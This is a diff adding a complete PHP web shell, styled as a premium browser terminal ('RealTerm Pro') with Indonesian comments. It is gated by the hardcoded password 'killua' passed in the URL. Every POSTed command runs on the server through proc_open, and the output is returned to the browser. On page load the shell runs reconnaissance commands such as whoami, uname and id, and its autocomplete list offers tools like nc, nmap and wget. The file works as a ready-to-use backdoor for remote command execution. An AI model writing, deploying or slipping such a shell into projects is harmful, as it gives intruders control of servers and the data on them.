@@ -1,0 +1,816 @@
+<?php
+/*
+ * RealTerm Pro - PHP Web Terminal Ultimate
+ * Terminal dengan tampilan premium dan fitur lengkap
+ */
+
+// ===== KONFIGURASI =====
+$password = 'killua';
+$hostname = gethostname();
+$username = 'www-data';
+$home = '/tmp';
+
+// ===== CEK PASSWORD =====
+if (!isset($_GET['p']) || $_GET['p'] !== $password) {
+    header('HTTP/1.0 401 Unauthorized');
+    header('Content-Type: text/html');
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head><title>Terminal Access</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0f, #1a1a2e, #0f0f1a);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            font-family: 'Inter', -apple-system, sans-serif;
+        }
+        .login-box {
+            background: rgba(12,12,24,0.96);
+            border: 1px solid rgba(99,102,241,0.2);
+            border-radius: 20px;
+            padding: 48px 40px 40px;
+            width: 420px;
+            box-shadow: 0 0 0 1px rgba(255,255,255,0.02), 0 40px 80px rgba(0,0,0,0.6);
+        }
+        .login-box .icon { text-align: center; font-size: 32px; margin-bottom: 16px; opacity: 0.6; }
+        .login-box h2 {
+            color: #e0e0e0; text-align: center; margin-bottom: 4px;
+            font-weight: 500; font-size: 16px; letter-spacing: 1px;
+        }
+        .login-box .sub { color: rgba(255,255,255,0.25); text-align: center; margin-bottom: 32px; font-size: 13px; }
+        .login-box input[type="password"] {
+            width: 100%; padding: 14px 18px; background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06); border-radius: 12px;
+            color: #e0e0e0; font-size: 15px; outline: none; transition: 0.3s;
+            font-family: 'SF Mono', 'JetBrains Mono', monospace;
+        }
+        .login-box input[type="password"]:focus {
+            border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99,102,241,0.1);
+        }
+        .login-box input[type="submit"] {
+            width: 100%; padding: 14px; margin-top: 16px;
+            background: linear-gradient(135deg, #6366f1, #818cf8);
+            border: none; border-radius: 12px; color: #fff; font-weight: 500;
+            font-size: 14px; cursor: pointer; transition: 0.3s; letter-spacing: 0.5px;
+        }
+        .login-box input[type="submit"]:hover {
+            transform: translateY(-1px); box-shadow: 0 8px 30px rgba(99,102,241,0.3);
+        }
+    </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <div class="icon">⌨️</div>
+            <h2>TERMINAL</h2>
+            <p class="sub">Masukkan password untuk melanjutkan</p>
+            <form method="get">
+                <input type="password" name="p" placeholder="password" autofocus>
+                <input type="submit" value="Masuk">
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ===== HANDLE AJAX =====
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    header('Content-Type: application/json');
+    $cmd = $_POST['cmd'];
+    $cwd = $_POST['cwd'] ?? getcwd();
+    
+    if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
+        $target = trim($m[1]) ?: ($_SERVER['HOME'] ?? '/tmp');
+        $target = str_replace('~', $_SERVER['HOME'] ?? '/tmp', $target);
+        if (file_exists($target) && is_dir($target)) {
+            @chdir($target);
+            $cwd = realpath($target);
+        }
+        echo json_encode(['output' => '', 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
+        exit;
+    }
+    
+    if (trim($cmd) === 'clear') {
+        echo json_encode(['output' => '__CLEAR__', 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
+        exit;
+    }
+    
+    $origDir = getcwd();
+    @chdir($cwd);
+    
+    $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+    $env = $_SERVER;
+    $env['PATH'] = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
+    $env['HOME'] = $home;
+    $env['TERM'] = 'xterm-256color';
+    
+    $process = @proc_open($cmd . ' 2>&1', $descriptorspec, $pipes, $cwd, $env);
+    $output = '';
+    if (is_resource($process)) {
+        @fclose($pipes[0]);
+        $output = stream_get_contents($pipes[1]);
+        @fclose($pipes[1]);
+        proc_close($process);
+    } else {
+        $output = "bash: command not found: $cmd\n";
+    }
+    
+    @chdir($origDir);
+    echo json_encode(['output' => $output, 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
+    exit;
+}
+
+// Handle autocomplete
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['autocomplete'])) {
+    header('Content-Type: application/json');
+    $partial = trim($_POST['partial']);
+    $suggestions = [];
+    
+    $commands = ['ls','cd','cat','rm','mv','cp','mkdir','touch','chmod','ps','grep','find','echo','export','sudo','apt','curl','wget','nc','nmap','ping','ssh','python','python3','php','perl','ruby','node','npm','gcc','make','uname','df','du','mount','ifconfig','ip','systemctl','service','crontab','tar','gzip','zip','unzip','id','whoami','who','history','clear','help','exit','reset','free','lsof','netstat','route','iptables','base64','md5sum','sha256sum','strings','file','stat','ln','tee','xargs','awk','sed','cut','tr','diff','dmesg','lsblk','nano','vim','htop','top','kill','pkill','alias','unalias','type','which','whereis','su','passwd','useradd','dpkg','dnf','pacman','snap','scp','rsync','ftp','sftp','make','cmake','configure','pip','pip3','composer','cargo','go','rustc','figlet','neofetch','screenfetch'];
+    
+    if (!empty($partial)) {
+        foreach ($commands as $cmd) {
+            if (strpos($cmd, $partial) === 0) $suggestions[] = $cmd;
+        }
+        $files = @scandir($cwd ?? getcwd());
+        if ($files) {
+            foreach ($files as $file) {
+                if ($file === '.' || $file === '..') continue;
+                if (strpos($file, $partial) === 0) {
+                    $suffix = (@is_dir(($cwd ?? getcwd()) . '/' . $file)) ? '/' : '';
+                    if (!in_array($file . $suffix, $suggestions)) $suggestions[] = $file . $suffix;
+                }
+            }
+        }
+        sort($suggestions);
+    }
+    
+    echo json_encode(array_slice($suggestions, 0, 50));
+    exit;
+}
+
+$cwd = getcwd();
+
+function generatePrompt($cwd) {
+    global $username, $hostname;
+    $home = $_SERVER['HOME'] ?? '/tmp';
+    $displayPath = $cwd;
+    if (strpos($cwd, $home) === 0) $displayPath = '~' . substr($cwd, strlen($home));
+    return "{$username}@{$hostname}:{$displayPath}\$ ";
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terminal — <?= htmlspecialchars($hostname) ?></title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+    
+    :root {
+        /* === Palette Premium === */
+        --bg-primary: #0c0c1a;
+        --bg-secondary: #14142a;
+        --bg-tertiary: #1c1c3a;
+        --bg-hover: rgba(99,102,241,0.06);
+        --bg-active: rgba(99,102,241,0.12);
+        
+        --border-subtle: rgba(255,255,255,0.04);
+        --border-medium: rgba(255,255,255,0.06);
+        --border-accent: rgba(99,102,241,0.2);
+        
+        --text-primary: #e8e8f0;
+        --text-secondary: rgba(255,255,255,0.45);
+        --text-tertiary: rgba(255,255,255,0.2);
+        --text-muted: rgba(255,255,255,0.08);
+        
+        --accent: #6366f1;
+        --accent-hover: #818cf8;
+        --accent-glow: rgba(99,102,241,0.15);
+        
+        --green: #34d399;
+        --green-dim: rgba(52,211,153,0.15);
+        --blue: #60a5fa;
+        --blue-dim: rgba(96,165,250,0.15);
+        --red: #f87171;
+        --red-dim: rgba(248,113,113,0.15);
+        --yellow: #fbbf24;
+        --yellow-dim: rgba(251,191,36,0.15);
+        --purple: #a78bfa;
+        --cyan: #22d3ee;
+        --orange: #fb923c;
+        
+        --radius-sm: 6px;
+        --radius-md: 8px;
+        --radius-lg: 12px;
+        --radius-xl: 16px;
+        
+        --shadow: 0 20px 60px rgba(0,0,0,0.6);
+        --shadow-glow: 0 0 80px rgba(99,102,241,0.03);
+        
+        --font: 'JetBrains Mono', 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+        --font-size: 14px;
+        --line-height: 1.55;
+    }
+    
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+        background: linear-gradient(160deg, #08081a 0%, #0e0e24 30%, #0a0a18 100%);
+        height: 100vh; overflow: hidden;
+        display: flex; align-items: center; justify-content: center;
+        font-family: var(--font);
+        padding: 20px;
+    }
+    
+    /* ===== CONTAINER ===== */
+    #terminal-container {
+        width: 100%; max-width: 1200px;
+        height: calc(100vh - 40px); max-height: 820px;
+        background: var(--bg-primary);
+        border-radius: var(--radius-xl);
+        overflow: hidden;
+        box-shadow: var(--shadow), var(--shadow-glow), 0 0 0 1px var(--border-subtle);
+        display: flex; flex-direction: column;
+        position: relative;
+    }
+    
+    /* ===== TITLE BAR ===== */
+    #title-bar {
+        display: flex; align-items: center;
+        padding: 10px 16px;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border-medium);
+        flex-shrink: 0; user-select: none;
+        -webkit-app-region: drag;
+    }
+    
+    .window-dots { display: flex; gap: 8px; margin-right: 16px; }
+    .dot {
+        width: 13px; height: 13px; border-radius: 50%;
+        transition: 0.15s; position: relative;
+        -webkit-app-region: no-drag;
+    }
+    .dot.close { background: #ff5f57; }
+    .dot.minimize { background: #febc2e; }
+    .dot.maximize { background: #28c840; }
+    .dot:hover { filter: brightness(1.2); transform: scale(1.1); }
+    
+    .window-title {
+        color: var(--text-secondary); font-size: 12px;
+        font-weight: 500; letter-spacing: 0.3px;
+        flex: 1; display: flex; align-items: center; gap: 8px;
+    }
+    .window-title .indicator {
+        display: inline-block; width: 7px; height: 7px;
+        border-radius: 50%; background: var(--green);
+        box-shadow: 0 0 6px rgba(52,211,153,0.4);
+    }
+    .window-title .host-label { color: var(--text-tertiary); }
+    
+    .window-info { display: flex; gap: 16px; align-items: center; }
+    .window-info .status {
+        color: var(--text-tertiary); font-size: 11px; display: flex; align-items: center; gap: 5px;
+    }
+    .window-info .status .dot-online {
+        width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+        animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.4; }
+    }
+    
+    .window-info .time {
+        color: var(--text-tertiary); font-size: 11px;
+    }
+    
+    /* ===== TERMINAL BODY ===== */
+    #terminal-body {
+        flex: 1; display: flex; flex-direction: column;
+        background: var(--bg-primary); position: relative; overflow: hidden;
+    }
+    
+    /* Grid overlay */
+    #terminal-body::before {
+        content: ''; position: absolute; inset: 0;
+        background-image: 
+            linear-gradient(rgba(255,255,255,0.006) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(255,255,255,0.006) 1px, transparent 1px);
+        background-size: 20px 20px;
+        pointer-events: none; z-index: 0;
+    }
+    
+    /* ===== OUTPUT ===== */
+    #output {
+        flex: 1; overflow-y: auto; overflow-x: hidden;
+        padding: 14px 18px 6px;
+        font-size: var(--font-size); line-height: var(--line-height);
+        color: var(--text-primary); position: relative; z-index: 1;
+        scroll-behavior: smooth;
+    }
+    
+    #output::-webkit-scrollbar { width: 4px; }
+    #output::-webkit-scrollbar-track { background: transparent; }
+    #output::-webkit-scrollbar-thumb { background: var(--text-muted); border-radius: 10px; }
+    #output::-webkit-scrollbar-thumb:hover { background: var(--text-tertiary); }
+    
+    /* ===== LINES ===== */
+    .line { padding: 1px 0; min-height: 21px; word-break: break-word; white-space: pre-wrap; }
+    .line.cmd { color: var(--text-primary); }
+    .line.out { color: rgba(255,255,255,0.82); }
+    .line.out.error { color: var(--red); }
+    .line.out.success { color: var(--green); }
+    .line.out.info { color: var(--blue); }
+    .line.out.warning { color: var(--yellow); }
+    .line.out.highlight { 
+        background: var(--bg-active); border-radius: 3px; padding: 1px 6px; margin: 0 -6px;
+    }
+    .line.sep { height: 6px; }
+    
+    /* ===== PROMPT ===== */
+    .prompt { }
+    .prompt .user { color: var(--green); font-weight: 600; }
+    .prompt .sep { color: var(--text-tertiary); }
+    .prompt .host { color: var(--blue); font-weight: 500; }
+    .prompt .colon { color: var(--text-tertiary); }
+    .prompt .path { color: var(--blue); }
+    .prompt .dollar { color: var(--green); font-weight: 600; }
+    
+    /* ===== INPUT BAR ===== */
+    #input-bar {
+        display: flex; align-items: center;
+        padding: 6px 18px 14px;
+        background: linear-gradient(0deg, var(--bg-primary) 50%, transparent);
+        position: relative; z-index: 2; flex-shrink: 0;
+        border-top: 1px solid var(--border-subtle);
+    }
+    
+    #prompt-display {
+        color: var(--green); font-size: var(--font-size);
+        white-space: nowrap; margin-right: 10px;
+        user-select: none; line-height: 1.4; flex-shrink: 0;
+    }
+    
+    #input-wrapper {
+        flex: 1; position: relative; display: flex; align-items: center;
+    }
+    
+    #cmd-input {
+        flex: 1; background: transparent; border: none;
+        color: var(--text-primary); font-family: var(--font);
+        font-size: var(--font-size); outline: none;
+        caret-color: var(--green); line-height: 1.4; padding: 0;
+    }
+    
+    #cmd-input::placeholder {
+        color: var(--text-muted); font-size: 13px; user-select: none;
+    }
+    
+    /* Cursor gemerlap */
+    @keyframes cursorGlow {
+        0%, 100% { caret-color: var(--green); }
+        50% { caret-color: var(--accent); }
+    }
+    #cmd-input:focus { animation: cursorGlow 3s infinite; }
+    
+    /* ===== AUTOCOMPLETE ===== */
+    #autocomplete {
+        display: none; position: absolute; bottom: 100%; left: 0; right: 0;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-medium); border-radius: var(--radius-lg);
+        padding: 5px; max-height: 220px; overflow-y: auto;
+        box-shadow: 0 -8px 40px rgba(0,0,0,0.5); z-index: 100;
+        backdrop-filter: blur(20px);
+    }
+    #autocomplete::-webkit-scrollbar { width: 3px; }
+    #autocomplete::-webkit-scrollbar-thumb { background: var(--text-muted); border-radius: 10px; }
+    
+    .ac-item {
+        padding: 4px 10px; color: var(--text-secondary);
+        font-size: 13px; cursor: pointer; border-radius: var(--radius-sm);
+        transition: 0.1s; white-space: nowrap;
+    }
+    .ac-item:hover, .ac-item.selected { 
+        background: var(--bg-hover); color: var(--text-primary); 
+    }
+    .ac-item .tag { 
+        color: var(--text-tertiary); font-size: 10px; margin-left: 8px;
+        background: var(--bg-tertiary); padding: 1px 6px; border-radius: 3px;
+    }
+    
+    /* ===== WELCOME ===== */
+    .welcome {
+        padding: 2px 0 10px; font-size: 12px; line-height: 1.7;
+        color: var(--text-secondary);
+    }
+    .welcome .title { color: var(--text-primary); font-weight: 600; font-size: 13px; }
+    .welcome .hl { color: var(--accent); }
+    .welcome .cmd-hint { color: var(--green); background: var(--green-dim); padding: 0 6px; border-radius: 3px; }
+    .welcome .info { color: var(--blue); }
+    
+    /* ===== TAB BAR ===== */
+    #tab-bar {
+        display: flex; align-items: center; gap: 0;
+        padding: 0 10px; background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border-medium); flex-shrink: 0;
+        overflow-x: auto; user-select: none;
+    }
+    #tab-bar::-webkit-scrollbar { height: 0; }
+    
+    .tab-item {
+        display: flex; align-items: center; gap: 8px;
+        padding: 8px 14px; font-size: 12px; color: var(--text-tertiary);
+        border-bottom: 2px solid transparent; cursor: pointer;
+        transition: 0.15s; white-space: nowrap; flex-shrink: 0;
+    }
+    .tab-item:hover { color: var(--text-secondary); background: var(--bg-hover); }
+    .tab-item.active { 
+        color: var(--text-primary); border-bottom-color: var(--accent); 
+        background: var(--bg-hover);
+    }
+    .tab-item .tab-close {
+        font-size: 10px; opacity: 0; transition: 0.15s; color: var(--text-tertiary);
+    }
+    .tab-item:hover .tab-close { opacity: 1; }
+    .tab-item .tab-close:hover { color: var(--red); }
+    
+    .tab-add {
+        padding: 8px 10px; color: var(--text-tertiary); cursor: pointer;
+        font-size: 14px; transition: 0.15s;
+    }
+    .tab-add:hover { color: var(--text-secondary); }
+    
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 768px) {
+        body { padding: 10px; }
+        #terminal-container { border-radius: var(--radius-lg); max-height: none; height: calc(100vh - 20px); }
+        #title-bar { padding: 8px 12px; }
+        .window-dots { gap: 6px; margin-right: 12px; }
+        .dot { width: 11px; height: 11px; }
+        .window-title { font-size: 11px; }
+        .window-info .time { display: none; }
+        #output { padding: 10px 12px 4px; font-size: 12px; line-height: 1.5; }
+        #input-bar { padding: 4px 12px 12px; }
+        #prompt-display { font-size: 12px; }
+        #cmd-input { font-size: 12px; }
+        #tab-bar .tab-item { padding: 6px 10px; font-size: 11px; }
+    }
+    
+    @media (max-width: 480px) {
+        body { padding: 4px; }
+        #terminal-container { border-radius: var(--radius-md); }
+        #output { padding: 8px 8px 2px; font-size: 11px; }
+        #input-bar { padding: 2px 8px 10px; }
+        #prompt-display { font-size: 11px; }
+        #cmd-input { font-size: 11px; }
+        .window-info { display: none; }
+    }
+</style>
+</head>
+<body>
+
+<div id="terminal-container">
+    <!-- Title Bar -->
+    <div id="title-bar">
+        <div class="window-dots">
+            <div class="dot close" title="Tutup"></div>
+            <div class="dot minimize" title="Minimize"></div>
+            <div class="dot maximize" title="Fullscreen" onclick="document.body.requestFullscreen?.();"></div>
+        </div>
+        <div class="window-title">
+            <span class="indicator"></span>
+            Terminal
+            <span class="host-label">— <?= htmlspecialchars($hostname) ?></span>
+        </div>
+        <div class="window-info">
+            <span class="status"><span class="dot-online"></span> connected</span>
+            <span class="time"><?= date('H:i') ?></span>
+        </div>
+    </div>
+    
+    <!-- Tab Bar -->
+    <div id="tab-bar">
+        <div class="tab-item active" data-tab="0">
+            <span>⬡</span> terminal
+            <span class="tab-close">✕</span>
+        </div>
+        <div class="tab-add" title="New tab">+</div>
+    </div>
+    
+    <!-- Terminal Body -->
+    <div id="terminal-body">
+        <div id="output">
+            <div class="welcome">
+                <div><span class="title">◆ PHP Web Terminal Pro</span> <span style="color:var(--text-tertiary);">v4.0</span></div>
+                <div style="margin-top:2px;">
+                    Connected to <span class="info"><?= htmlspecialchars($hostname) ?></span>
+                    — type <span class="cmd-hint">help</span> for commands
+                </div>
+                <div class="line sep"></div>
+            </div>
+            <div id="output-content"></div>
+        </div>
+        
+        <!-- Autocomplete -->
+        <div id="autocomplete"></div>
+        
+        <!-- Input -->
+        <div id="input-bar">
+            <span id="prompt-display"><?= generatePrompt($cwd) ?></span>
+            <div id="input-wrapper">
+                <input type="text" id="cmd-input" autofocus spellcheck="false" autocomplete="off" placeholder="Type a command...">
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ===== STATE =====
+const state = {
+    history: [],
+    historyIdx: -1,
+    cwd: '<?= addslashes($cwd) ?>',
+    prompt: '<?= addslashes(generatePrompt($cwd)) ?>',
+    processing: false,
+    tabSug: [],
+    tabIdx: 0,
+    tabPressed: false,
+    theme: 'dark'
+};
+
+// ===== DOM REFS =====
+const output = document.getElementById('output-content');
+const input = document.getElementById('cmd-input');
+const promptEl = document.getElementById('prompt-display');
+const autoEl = document.getElementById('autocomplete');
+const termBody = document.getElementById('terminal-body');
+
+// ===== UTILITIES =====
+function scrollBottom() {
+    const el = document.getElementById('output');
+    requestAnimationFrame(() => { el.scrollTop = el.scrollHeight; });
+}
+
+function addLine(text, cls = 'out') {
+    const div = document.createElement('div');
+    div.className = 'line ' + cls;
+    div.textContent = text;
+    output.appendChild(div);
+    scrollBottom();
+    return div;
+}
+
+function setPrompt(p) {
+    state.prompt = p;
+    promptEl.textContent = p;
+}
+
+// ===== SMART OUTPUT =====
+function smartOutput(text) {
+    const lines = text.replace(/\n$/, '').split('\n');
+    lines.forEach(l => {
+        const lower = l.toLowerCase();
+        if (lower.includes('error') || lower.includes('not found') || lower.includes('denied') || lower.includes('failed') || lower.includes('cannot') || lower.includes('no such')) {
+            addLine(l, 'out error');
+        } else if (lower.includes('success') || lower.includes('connected') || l.startsWith('uid=')) {
+            addLine(l, 'out success');
+        } else if (lower.includes('warning') || lower.includes('notice')) {
+            addLine(l, 'out warning');
+        } else if (lower.startsWith('linux') || lower.includes('gnu/') || lower.includes('architecture') || lower.includes('processor')) {
+            addLine(l, 'out info');
+        } else {
+            addLine(l, 'out');
+        }
+    });
+}
+
+// ===== SEND COMMAND =====
+function sendCmd() {
+    if (state.processing) return;
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    
+    state.history.push(cmd);
+    state.historyIdx = state.history.length;
+    
+    addLine(state.prompt + cmd, 'cmd');
+    input.value = '';
+    
+    // Built-in
+    if (cmd.toLowerCase() === 'help') {
+        addLine('╔══════════════════════════════════════════════════════╗', 'out info');
+        addLine('║  Semua perintah Linux standar tersedia            ║', 'out info');
+        addLine('║  cd [dir]     — Pindah direktori                 ║', 'out info');
+        addLine('║  clear        — Bersihkan layar                  ║', 'out info');
+        addLine('║  help         — Tampilkan bantuan                ║', 'out info');
+        addLine('║  history      — Riwayat perintah                 ║', 'out info');
+        addLine('║  pwd          — Direktori saat ini               ║', 'out info');
+        addLine('║  whoami       — User saat ini                    ║', 'out info');
+        addLine('║  id           — Informasi user                   ║', 'out info');
+        addLine('║  uname -a     — Info sistem                      ║', 'out info');
+        addLine('║  df -h        — Disk usage                       ║', 'out info');
+        addLine('║  free -h      — Memory usage                     ║', 'out info');
+        addLine('║  ps aux       — Proses berjalan                  ║', 'out info');
+        addLine('║  ls -la       — List file detail                 ║', 'out info');
+        addLine('║  exit         — Keluar                           ║', 'out info');
+        addLine('╚══════════════════════════════════════════════════════╝', 'out info');
+        setPrompt(state.prompt);
+        input.focus();
+        return;
+    }
+    
+    if (cmd.toLowerCase() === 'history') {
+        state.history.forEach((c, i) => addLine(`  ${i+1}  ${c}`, 'out'));
+        setPrompt(state.prompt);
+        input.focus();
+        return;
+    }
+    
+    if (cmd.toLowerCase() === 'exit') {
+        addLine('logout', 'out warning');
+        setTimeout(() => window.location.href = window.location.pathname, 600);
+        return;
+    }
+    
+    state.processing = true;
+    const fd = new FormData();
+    fd.append('cmd', cmd);
+    fd.append('cwd', state.cwd);
+    
+    fetch(window.location.href, { method: 'POST', body: fd })
+    .then(r => r.json())
+    .then(d => {
+        if (d.output === '__CLEAR__') {
+            output.innerHTML = '';
+        } else if (d.output) {
+            smartOutput(d.output);
+        }
+        state.cwd = d.cwd;
+        setPrompt(d.prompt);
+        state.processing = false;
+        input.focus();
+    })
+    .catch(e => {
+        addLine('Error: ' + e.message, 'out error');
+        state.processing = false;
+        input.focus();
+    });
+}
+
+// ===== AUTOCOMPLETE =====
+function fetchAutocomplete(partial) {
+    if (!partial.trim()) { autoEl.style.display = 'none'; return; }
+    const fd = new FormData();
+    fd.append('autocomplete', '1');
+    fd.append('partial', partial);
+    fd.append('cwd', state.cwd);
+    fetch(window.location.href, { method: 'POST', body: fd })
+    .then(r => r.json())
+    .then(sug => {
+        if (sug.length) {
+            state.tabSug = sug;
+            state.tabIdx = 0;
+            renderAutoComplete(sug, 0);
+        } else {
+            autoEl.style.display = 'none';
+        }
+    });
+}
+
+function renderAutoComplete(items, sel) {
+    autoEl.innerHTML = '';
+    items.forEach((s, i) => {
+        const d = document.createElement('div');
+        d.className = 'ac-item' + (i === sel ? ' selected' : '');
+        const isDir = s.endsWith('/');
+        d.innerHTML = escapeHtml(s) + (isDir ? ' <span class="tag">dir</span>' : ' <span class="tag">cmd</span>');
+        d.onclick = () => { input.value = s; autoEl.style.display = 'none'; input.focus(); };
+        autoEl.appendChild(d);
+    });
+    autoEl.style.display = 'block';
+}
+
+function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+}
+
+// ===== KEYBOARD =====
+input.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        autoEl.style.display = 'none';
+        sendCmd();
+        state.tabPressed = false;
+    }
+    else if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        autoEl.style.display = 'none';
+        if (state.historyIdx > 0) {
+            state.historyIdx--;
+            this.value = state.history[state.historyIdx];
+        }
+        state.tabPressed = false;
+    }
+    else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        autoEl.style.display = 'none';
+        if (state.historyIdx < state.history.length - 1) {
+            state.historyIdx++;
+            this.value = state.history[state.historyIdx];
+        } else {
+            state.historyIdx = state.history.length;
+            this.value = '';
+        }
+        state.tabPressed = false;
+    }
+    else if (e.key === 'Tab') {
+        e.preventDefault();
+        const val = this.value.trim();
+        if (!state.tabPressed && val) {
+            fetchAutocomplete(val);
+            state.tabPressed = true;
+            state.tabIdx = 0;
+        } else if (state.tabPressed && state.tabSug.length) {
+            state.tabIdx = (state.tabIdx + 1) % state.tabSug.length;
+            renderAutoComplete(state.tabSug, state.tabIdx);
+            this.value = state.tabSug[state.tabIdx];
+        }
+    }
+    else if (e.key === 'Escape') {
+        autoEl.style.display = 'none';
+        state.tabPressed = false;
+    }
+    else if (e.key === 'l' && e.ctrlKey) {
+        e.preventDefault();
+        output.innerHTML = '';
+        state.tabPressed = false;
+    }
+    else if (e.key === 'c' && e.ctrlKey) {
+        e.preventDefault();
+        addLine('^C', 'out warning');
+        setPrompt(state.prompt);
+        state.processing = false;
+        state.tabPressed = false;
+    }
+    else if (e.key === 'd' && e.ctrlKey) {
+        e.preventDefault();
+        addLine('logout', 'out warning');
+        setTimeout(() => window.location.href = window.location.pathname, 600);
+    }
+    else {
+        state.tabPressed = false;
+        setTimeout(() => autoEl.style.display = 'none', 150);
+    }
+});
+
+input.addEventListener('input', function() {
+    state.tabPressed = false;
+});
+
+// ===== CLICK TO FOCUS =====
+termBody.addEventListener('click', () => input.focus());
+
+// ===== INIT =====
+window.addEventListener('load', () => {
+    input.focus();
+    
+    // Ambil info sistem
+    const fd = new FormData();
+    fd.append('cmd', 'echo "User: $(whoami) | Host: $(hostname) | OS: $(uname -s) $(uname -r) | Uptime: $(uptime -p | sed "s/up //")"');
+    fd.append('cwd', state.cwd);
+    
+    fetch(window.location.href, { method: 'POST', body: fd })
+    .then(r => r.json())
+    .then(d => {
+        if (d.output) {
+            smartOutput('╭─ System Info ──────────────────────────────');
+            smartOutput(d.output.replace(/\n$/, ''));
+            smartOutput('╰────────────────────────────────────────────');
+            state.cwd = d.cwd;
+            setPrompt(d.prompt);
+        }
+    })
+    .catch(() => {
+        // Fallback: coba id
+        const fd2 = new FormData();
+        fd2.append('cmd', 'id');
+        fd2.append('cwd', state.cwd);
+        fetch(window.location.href, { method: 'POST', body: fd2 })
+        .then(r => r.json())
+        .then(d => {
+            if (d.output) smartOutput(d.output.replace(/\n$/, ''), 'out success');
+            state.cwd = d.cwd;
+            setPrompt(d.prompt);
+        });
+    });
+});
+</script>
+</body>
+</html>
